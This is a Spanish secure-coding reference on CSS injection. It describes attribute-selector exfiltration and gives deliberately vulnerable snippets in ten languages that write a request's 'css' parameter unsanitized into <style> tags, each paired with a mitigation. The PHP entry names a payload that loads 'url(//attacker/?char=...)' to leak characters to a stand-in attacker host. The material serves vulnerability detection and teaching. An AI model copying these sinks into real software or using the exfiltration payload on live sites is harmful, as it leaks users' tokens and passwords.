# CSS Injection (CSSI)

## Descripción General
Aparece cuando datos controlados por el usuario se insertan directamente dentro de etiquetas `<style>` o atributos `style=""` sin neutralización. Los atacantes pueden inyectar reglas CSS que cargan recursos externos condicionalmente mediante selectores de atributos (ej. `input[value^="a"] { background: url(...) }`), permitiendo la exfiltración carácter por carácter de tokens sensibles, contraseñas o contenido de la página.

## Patrones y Señales para Análisis SAST
- Interpolación de parámetros en bloques `<style>` o atributos `style`.
- Falta de sanitización de caracteres como `{`, `}`, `@import`, `url()` y `;`.

## Estrategia de Mitigación y Buenas Prácticas
- Evitar generar estilos CSS dinámicos a partir de entradas de usuario.
- Si es indispensable permitir personalización visual, restringir a una allowlist estricta de nombres de clases o colores válidos.
- Implementar Content Security Policy (CSP) restrictiva prohibiendo `unsafe-inline` en directivas `style-src`.

## Análisis Técnico y Ejemplos por Lenguaje

### 1. Python ([python.py](./python.py))
```python
# CSS Injection (CSSI)
def demo():
    return f'<style>{request.args.get("css", "body{}")}</style>'
```
- **Sink peligroso y causa raíz:** Interpolación de `request.args["css"]` en bloques `<style>`.
- **Mecanismo de explotación y vector:** Exfiltración de tokens CSRF y valores de inputs mediante selectores de atributo CSS.
- **Remediación idiomática:** Permitir únicamente identificadores predefinidos de temas en lugar de CSS arbitrario.

### 2. JavaScript / Node.js ([javascript.js](./javascript.js))
```javascript
// CSS Injection (CSSI)
function demo(req, res) {
  res.send(`<style>${req.query.css}</style>`);
  }
```
- **Sink peligroso y causa raíz:** Inyección directa de parámetros en cadenas HTML con `<style>${css}</style>`.
- **Mecanismo de explotación y vector:** Robo de datos sensibles en el navegador sin necesidad de ejecutar JavaScript directo.
- **Remediación idiomática:** Sanitizar con allowlists de valores o usar CSP estricto `style-src 'self'`.

### 3. Java ([java.java](./java.java))
```java
// CSS Injection (CSSI)
public class Example {
  public void demo() throws Exception {
    response.getWriter().write("<style>"+request.getParameter("css")+"</style>");
      }
}
```
- **Sink peligroso y causa raíz:** Concatenación de parámetros en la respuesta con `<style>` en servlets.
- **Mecanismo de explotación y vector:** Filtración de datos y alteración de la interfaz para ataques de phishing.
- **Remediación idiomática:** Restringir estilos a propiedades y valores validados con regex positiva (ej. códigos hexadecimales `#RRGGBB`).

### 4. Go ([go.go](./go.go))
```go
// CSS Injection (CSSI)
package main
func demo() {
  fmt.Fprintf(w,"<style>%s</style>",r.URL.Query().Get("css"))
  }
```
- **Sink peligroso y causa raíz:** Uso de `fmt.Fprintf` para renderizar hojas de estilo dinámicas con input.
- **Mecanismo de explotación y vector:** Exfiltración de información confidencial en el navegador.
- **Remediación idiomática:** Validar estrictamente con regex alfanumérica o códigos de color seguros.

### 5. PHP ([php.php](./php.php))
```php
<?php
// CSS Injection (CSSI)
echo '<style>'.$_GET['css'].'</style>';
```
- **Sink peligroso y causa raíz:** Echo directo de `$_GET["css"]` dentro de etiquetas `<style>`.
- **Mecanismo de explotación y vector:** Carga de URLs maliciosas externas mediante `background: url(//attacker/?char=...)`.
- **Remediación idiomática:** Aplicar allowlist estricta de estilos o usar `htmlspecialchars()` si se renderiza como texto.

### 6. C# (.NET) ([csharp.cs](./csharp.cs))
```csharp
// CSS Injection (CSSI)
public class Example {
  public void Demo() {
    Response.Write("<style>" + Request.Query["css"] + "</style>");
      }
}
```
- **Sink peligroso y causa raíz:** Asignación directa de CSS desde `Request.Query` en vistas Razor.
- **Mecanismo de explotación y vector:** Robo de datos confidenciales en el cliente.
- **Remediación idiomática:** Usar clases CSS parametrizadas en lugar de inyección de sintaxis CSS.

### 7. Ruby ([ruby.rb](./ruby.rb))
```ruby
# CSS Injection (CSSI)
def demo(params)
  render html: "<style>#{params[:css]}</style>".html_safe
  end
```
- **Sink peligroso y causa raíz:** Renderizado de `params[:css]` dentro de tags `<style>`.
- **Mecanismo de explotación y vector:** Lectura ciega de campos de formulario protegidos.
- **Remediación idiomática:** Restringir a opciones fijas de diseño en el modelo.

### 8. Rust ([rust.rs](./rust.rs))
```rust
// CSS Injection (CSSI)
fn demo() {
  let html = format!("<style>{}</style>", css);
  }
```
- **Sink peligroso y causa raíz:** Formateo de respuestas HTML con CSS arbitrario del cliente.
- **Mecanismo de explotación y vector:** Exfiltración condicional de credenciales.
- **Remediación idiomática:** Usar allowlists de nombres de clases predefinidas.

### 9. Perl ([perl.pl](./perl.pl))
```perl
# CSS Injection (CSSI)
sub demo {
  print '<style>' . param('css') . '</style>';
  }
```
- **Sink peligroso y causa raíz:** Impresión de estilos recibidos por parámetro.
- **Mecanismo de explotación y vector:** Ataques de inferencia de datos basados en CSS.
- **Remediación idiomática:** Neutralizar caracteres que permitan abrir y cerrar bloques CSS.

### 10. Pascal / Free Pascal ([pascal.pas](./pascal.pas))
```pascal
{ CSS Injection (CSSI) }
program Example;
begin
  Response.Content := '<style>' + Request.QueryFields.Values['css'] + '</style>';
  end.
```
- **Sink peligroso y causa raíz:** Inclusión de CSS externo en el cuerpo de la respuesta.
- **Mecanismo de explotación y vector:** Manipulación de estilos e intercepción visual.
- **Remediación idiomática:** Reemplazar por clases CSS estáticas precompiladas.
